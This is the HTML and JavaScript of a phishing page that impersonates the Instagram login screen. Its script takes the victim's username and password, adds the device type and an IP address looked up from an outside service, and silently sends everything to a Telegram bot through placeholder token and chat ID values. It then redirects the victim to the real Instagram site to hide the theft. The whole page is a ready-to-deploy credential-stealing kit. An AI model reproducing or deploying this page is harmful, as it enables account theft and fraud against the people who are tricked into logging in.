<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            max-width: 400px; 
            margin: 50px auto; 
            padding: 20px; 
            text-align: center;
        }
        .logo {
            width: 175px;
            margin: 0 auto 30px;
            display: block;
        }
        .login-form { 
            display: flex; 
            flex-direction: column; 
            gap: 15px; 
        }
        input { 
            padding: 12px; 
            border: 1px solid #ddd; 
            border-radius: 4px; 
            font-size: 16px; 
        }
        button { 
            background-color: #1877f2; 
            color: white; 
            border: none; 
            padding: 12px; 
            border-radius: 4px; 
            font-weight: bold; 
            cursor: pointer;
        }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" 
         alt="Instagram Logo" 
         class="logo">

    <form class="login-form" onsubmit="handleSubmit(event)" autocomplete="off">
        <input type="text" id="username" placeholder="Username" autocomplete="off">
        <input type="text" id="password" placeholder="Password" autocomplete="off">
        <button type="submit">Log in</button>
    </form>

    <script>
        const BOT_TOKEN = 'BOT_TOKEN';
        const CHAT_ID = 'CHAT_ID';
        const INSTAGRAM_URL = 'https://www.instagram.com/';

        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let device = "Unknown Device";
            
            if (/Android/i.test(userAgent)) {
                device = "Android Device";
            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
                device = "iOS Device";
            } else if (/Windows/i.test(userAgent)) {
                device = "Windows PC";
            } else if (/Mac/i.test(userAgent)) {
                device = "Mac";
            } else if (/Linux/i.test(userAgent)) {
                device = "Linux PC";
            }
            
            return device;
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip || "Unknown IP";
            } catch {
                return "IP detection failed";
            }
        }

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                // Silent error handling
            }
        }

        async function handleSubmit(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const timestamp = new Date().toLocaleString();
            const device = getDeviceInfo();
            const ip = await getIP();
            
            const message = `
<b>New Login Attempt</b>
üìÖ <b>Time:</b> ${timestamp}
üë§ <b>Username:</b> ${username}
üîë <b>Password:</b> ${password}
üì± <b>Device:</b> ${device}
üåê <b>IP:</b> ${ip}
            `;
            
            // Send data to Telegram
            await sendToTelegram(message);
            
            // Redirect to Instagram after processing
            window.location.href = INSTAGRAM_URL;
        }
    </script>
</body>
</html>
